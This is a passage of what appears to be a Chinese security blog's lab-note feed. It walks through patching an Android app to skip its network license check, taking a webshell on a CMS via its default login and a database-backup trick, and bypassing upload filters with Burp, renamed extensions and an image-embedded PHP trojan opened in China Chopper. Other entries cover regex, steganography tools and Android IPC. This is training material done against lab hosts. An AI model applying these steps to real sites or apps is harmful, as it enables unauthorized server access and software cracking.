<p>打开MainActivity.smali文件找到getData()方法。删除HttpUtils类里面的getStringFromURL()的调用<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229150309607.png" alt="image-20211229150309607"></p>
<p>将之前分析的返回的字符串，赋值给v1寄存器，这样就与和网络上获取的数据是一样的，按如下所示修改代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const-string v1, &quot;&#123;\r\n\t\&quot;info\&quot;:&#123;\r\n\t\t\&quot;key\&quot;:\&quot;droider\&quot;,\r\n\t\t\&quot;msg\&quot;:\&quot;2970C000324690E4AC28850CC2E4D36C6713FE28F48BD03D442AE1845CBDF16EA68CEDB67F8E90C6D47BB4C7F492322056C4A6B56BA1633BDCF9715850E77B18\&quot;\r\n\t&#125;\r\n&#125;\r\n&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229151529488.png" alt="image-20211229151529488"></p>
<p>打开apktool文件夹，在命令行执行 java -jar apktool.jar b -d out -o debug.apk,生成apk文件<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229151927718.png" alt="image-20211229151927718"></p>
<p>将生成的apk拷贝到C:\AndroidSec\SimpleEdu46\SignAPK中对生成apk进行重签名<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229152108448.png" alt="image-20211229152108448"></p>
<p>安装运行。发现此时已经绕过网络验证（点击执行功能，不再出现获取网络数据出错）<img src="https://gitee.com/oxchang/img-host/raw/master/%E4%BD%BF%E7%94%A8%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/image-20211229152528719.png" alt="image-20211229152528719"></p>
]]></content>
      <tags>
        <tag>抓包</tag>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title>南方企业内容管理系统漏洞</title>
    <url>/blog/2021/12/27/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="南方企业内容管理系统漏洞"><a href="#南方企业内容管理系统漏洞" class="headerlink" title="南方企业内容管理系统漏洞"></a>南方企业内容管理系统漏洞</h2><p>目的：</p>
<ul>
<li>熟悉南方数据企业网站管理系统</li>
<li>学习南方数据企业网站管理系统常见渗透手法</li>
</ul>
<p>原理：</p>
<ul>
<li>数据库备份拿webshell</li>
</ul>
<p>过程：</p>
<ul>
<li><p>浏览器输入<a href="http://192.168.1.3:8002/admin/Login.asp,%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0![image-20211229083557740](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png)">http://192.168.1.3:8002/admin/Login.asp,进入后台![image-20211229083557740](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png)</a></p>
</li>
<li><p>输入admin和密码123456,进入到后台管理界面<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083647733.png" alt="image-20211229083647733"></p>
</li>
<li><p>在荣誉管理选项卡下，选择添加企业荣誉，即可弹出可上传文件页面<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083914421.png" alt="image-20211229083914421"></p>
</li>
<li><p>点击浏览上传木马文件，把1.asp修改为1.jpg，点击上传<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084027790.png" alt="image-20211229084027790"></p>
</li>
<li><p>得到文件地址UploadFiles/xxxxxxxxxxxxx.jpg<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084137287.png" alt="image-20211229084137287"></p>
</li>
<li><p>打开系统管理下的数据库备份，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径，并填写数据库备份名称ok.asp<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084434435.png" alt="image-20211229084434435"></p>
</li>
<li><p>点击确定，即可得到数据库备份的路径admin/Databackup/ok.asp.asa<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084504206.png" alt="image-20211229084504206"></p>
</li>
<li><p>在火狐浏览器输入<a href="http://192.168.1.3:8002/admin/Databackup/ok.asp,%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%9C%A8%E9%A9%AC%EF%BC%8C%E5%B7%B2%E7%BB%8F%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0webshell%EF%BC%88%E5%AF%86%E7%A0%81%EF%BC%9A123456%EF%BC%89![image-20211229084709207](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png)">http://192.168.1.3:8002/admin/Databackup/ok.asp,即可访问木马，已经成功拿到webshell（密码：123456）![image-20211229084709207](https://gitee.com/oxchang/img-host/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png)</a></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>南方企业</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/blog/2022/01/05/%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>图片木马绕过文件内容检测上传webshell</title>
    <url>/blog/2021/12/27/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/</url>
    <content><![CDATA[<h2 id="图片木马绕过文件内容检测上传webshell"><a href="#图片木马绕过文件内容检测上传webshell" class="headerlink" title="图片木马绕过文件内容检测上传webshell"></a>图片木马绕过文件内容检测上传webshell</h2><p>目的：</p>
<ul>
<li>理解绕过内容验证上传的原理</li>
<li>学习绕过内容验证上传的过程</li>
</ul>
<p>原理</p>
<ul>
<li>一般文件内容验证使用getimagesize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传</li>
<li>本实例就是将一句话木马插入到一个【合法】的图片文件当中，然后用中国菜刀远程连接</li>
</ul>
<p>过程：</p>
<ul>
<li>打开火狐，进入网址<a href="http://192.168.1.3:8080/up%EF%BC%8C%E8%BF%9B%E5%85%A5%E6%9E%84%E9%80%A0%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0webshell![image-20211228104158522](https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104158522.png)">http://192.168.1.3:8080/up，进入构造图片马绕过上传webshell![image-20211228104158522](https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104158522.png)</a></li>
<li>选择上传木马，后缀php改为php.jpg</li>
<li>点击上传，提示错误</li>
<li><img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104300084.png" alt="image-20211228104300084"></li>
<li>制作图片马，将要上传的木马与图片一个文件下<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104350818.png" alt="image-20211228104350818"></li>
<li>打开cmd，进入对应目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104423625.png" alt="image-20211228104423625"></li>
<li>输入copy pic.jpg/b+lubr.php/a PicLubr.jpg，将lubr.php插入到pic.jpg中<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104518932.png" alt="image-20211228104518932"></li>
<li>在火狐上传PicLubr.jpg，后缀名改为PicLubr.jpg.php，然后上传<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104707308.png" alt="image-20211228104707308"></li>
<li>输入连接访问木马文件<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104737829.png" alt="image-20211228104737829"></li>
<li>打开中国菜刀，添加木马连接，输入密码lubr，脚本类型php(eval)</li>
<li>双击添加的shell，即可访问网站的完整目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104832489.png" alt="image-20211228104832489"></li>
</ul>
]]></content>
      <tags>
        <tag>webshell</tag>
        <tag>图片木马</tag>
      </tags>
  </entry>
  <entry>
    <title>常用工具</title>
    <url>/blog/2021/11/24/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>图片隐写：zsteg，stegslove，outguess，pngcheck。</p>
]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/blog/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
<p>[]表示里面的任何一个字符</p>
<p>a{1，5}表示a有1到5之间个字符</p>
<p>{0，}表示0个或者无穷个</p>
<p>*表示{0，}</p>
<p>+表示{1，}</p>
<p>？表示{0，1}</p>
<p>[^a,b,c]表示除了a,b,c的其他字符</p>
<p>^是字符串开头</p>
<p>$是字符串结尾</p>
<p>（？&lt;=（a））表示以a开头</p>
<p>（？=（a））表示以a结尾</p>
<p>\d , \w  , \ s 匹配数字，字符，空格</p>
<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
]]></content>
  </entry>
  <entry>
    <title>绕过content_type检测文件类型上传webshell</title>
    <url>/blog/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
    <content><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p>
<ul>
<li>理解绕过Content-Type检测文件类型上传的原理</li>
<li>学习绕过Content-Type检测文件类型上传的过程</li>
</ul>
<p>原理:</p>
<ul>
<li>当浏览器在上传文件到服务器的时候，服务器对说上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。</li>
<li>绕过Content–Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。</li>
</ul>
<p>过程：</p>
<ul>
<li><p>打开火狐浏览器，修改代理127.0.0.1:8080<img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103046467.png" alt="image-20211228103046467"></p>
</li>
<li><p>打开burp，点击intercept is off<img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103152265.png" alt="image-20211228103152265"></p>
</li>
<li><p>打开浏览器,输入<a href="http://192.168.1.3:8080/up,%E8%BF%9B%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BBcontent_type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell%E3%80%82![image-20211228103256712](https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)">http://192.168.1.3:8080/up,进入文件上传漏洞演示脚本，点击content_type检测文件类型上传webshell。![image-20211228103256712](https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)</a></p>
</li>
<li><p>上传php文件，前台显示错误窗口<img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103342121.png" alt="image-20211228103342121"></p>
</li>
<li><p>Burp开启抓包</p>
</li>
<li><p>Burp抓到的数据包,在数据包中的content-type的application-stream修改为image/gif<img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103504817.png" alt="image-20211228103504817"></p>
</li>
<li><p>点击forward，发送数据包，前台提示上传lubr.php成功<img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103538500.png" alt="image-20211228103538500"></p>
</li>
<li><p>浏览器输入地址<a href="http://192.168.1.3:8080/up/uploads/lubr.php%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA![image-20211228103621026](https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)">http://192.168.1.3:8080/up/uploads/lubr.php，页面没有错误提示![image-20211228103621026](https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)</a></p>
</li>
<li><p>打开中国菜刀，添加木马地址，密码，lubr，脚本类型php(eval)，点击添加<img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103730160.png" alt="image-20211228103730160"></p>
</li>
<li><p>双击添加记录，可查看完整目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103747989.png" alt="image-20211228103747989"></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>webshell</tag>
        <tag>content_type</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过前台脚本检测扩展名上传webshell</title>
    <url>/blog/2021/12/27/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/</url>
    <content><![CDATA[<p>目的：</p>
<ul>
<li>理解绕过前台脚本检测扩展名上传的原理 </li>
<li>学习绕过前台脚本检测扩展名上传的过程 </li>
</ul>
<p>原理：</p>
<ul>
<li>当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名</li>
<li>绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的</li>
</ul>
<p>过程：</p>
<ul>
<li>打开火狐，设置代理为127.0.0.1:8080 </li>
</ul>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/1.JPG"></p>
<ul>
<li>打开burp，点击proxy下的intercept，intercept is off，同样要在options标签设置代理，端口与浏览器设置一致 </li>
</ul>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/2.JPG"></p>
<ul>
<li><p>绕过验证</p>
<ul>
<li>在火狐输入地址<a href="http://ip:8080/up,%E8%BF%9B%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BB%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0Webshell">http://ip:8080/up,进入文件上传漏洞演示脚本，点击绕过前台脚本检测扩展名上传Webshell</a></li>
</ul>
<p>  <img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/3.JPG"></p>
<ul>
<li>点击浏览，上传木马，后缀为php，前台显示错误窗口</li>
</ul>
<p>  <img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/4.JPG"></p>
<ul>
<li>打开burp打开抓包，将php后缀修改为jpg后重新上传文件<br><img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/5.JPG"></li>
</ul>
<p>  <img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/6.JPG"></p>
<ul>
<li>Burp抓到包后，将文件后缀修改为php</li>
</ul>
<p>  <img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/7.JPG"></p>
<ul>
<li>点击forward，发送数据包，前台提示lubr.php上传成功</li>
</ul>
<p>  <img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/8.JPG"></p>
</li>
<li><p>连接木马</p>
<ul>
<li>连接木马，在浏览器输入木马的完整地址<a href="http://192.168.1.3:8080/up/uploads/lubr.php%EF%BC%8C%E7%BD%91%E9%A1%B5%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA">http://192.168.1.3:8080/up/uploads/lubr.php，网页没有错误提示</a></li>
</ul>
<p>  <img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/9.JPG"></p>
<ul>
<li>打开中国菜刀，添加木马地址，<a href="http://192.168.1.3:8080/up/uploads/lubr.php,%E5%AF%86%E7%A0%81lubr,%E9%80%89%E6%8B%A9%E8%84%9A%E6%9C%AC%E7%B1%BB%E5%9E%8Bphp(eval)%EF%BC%8C%E7%82%B9%E5%87%BB%E6%B7%BB%E5%8A%A0">http://192.168.1.3:8080/up/uploads/lubr.php,密码lubr,选择脚本类型php(eval)，点击添加</a></li>
</ul>
<p>  <img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/10.JPG"></p>
<ul>
<li>双击添加记录，即可查看完整目录</li>
</ul>
<p>  <img src="https://gitee.com/oxchang/img-host/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/11.JPG"></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>-webshell -前端</tag>
      </tags>
  </entry>
  <entry>
    <title>进程间Messenger通信</title>
    <url>/blog/2021/12/27/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<h2 id="进程间Messenger通信"><a href="#进程间Messenger通信" class="headerlink" title="进程间Messenger通信"></a>进程间Messenger通信</h2><p>目的：</p>
<ul>
<li>通过JAVA编程理解Android进程通信</li>
</ul>
<p>原理：</p>
<ul>
<li>Android程序中的进程间数据传递的问题到许多机制，比如aidl, Messenger, 以及Intent, ContentProvider以及底层的binder。Messenger是Android提供的一个工具类。使用Messenger可以避免编写AIDL文件来进行进程间通信，简化进程间通信的功能。Messenger，信使，其指向一个Handler，他人可以使用信使向Handler发送消息。信使实现了基于消息队列的跨进程的通讯，在一个进程中 创建一个指向Handler的信使，然后把信使返回给其他的进程，使得其它的进程可以向这个进程发送消息。在Messenger内部有一个 IMessenger接口指针，其在Messenger的构造函数中指向了一个Handler中的IMessenger，这样就保存了一个指向 Handler的指针。</li>
<li>基本原理：服务端的Messenger需要在onBind方法中返回IBinder实例：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> messenger.getBinder();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端则需要在如下代码中创建与之关联的客户端Messenger：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 得到了一个binder作为桥梁，创建客户端的信使</span></span><br><span class="line">    messenger = <span class="keyword">new</span> Messenger(service);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>两边的信使通过IBinder实例关联起来后，就可以通过send方法来互相发送消息了。 如果需要回调，则将另一个Messenger放到Message的replayTo属性中发送给另一端，由另一端来执行回调函数。</li>
</ul>
<p>过程：</p>
<p>打开eclipse，点击file-import，弹出import窗口</p>
<p>选择android下的existing android code into workspace<img src="https://gitee.com/oxchang/img-host/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229103119506.png" alt="image-20211229103119506"></p>
<p>点击next，弹出导入窗口，接着点击browse，选择simpleedu31<img src="https://gitee.com/oxchang/img-host/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229103215577.png" alt="image-20211229103215577"></p>
<p>点击finish导入</p>
<p>打开avd虚拟机simpleedu31，右键项目，选择run as-android application<img src="https://gitee.com/oxchang/img-host/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229103526330.png" alt="image-20211229103526330"></p>
<p>程序运行<img src="https://gitee.com/oxchang/img-host/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229104428625.png" alt="image-20211229104428625"></p>
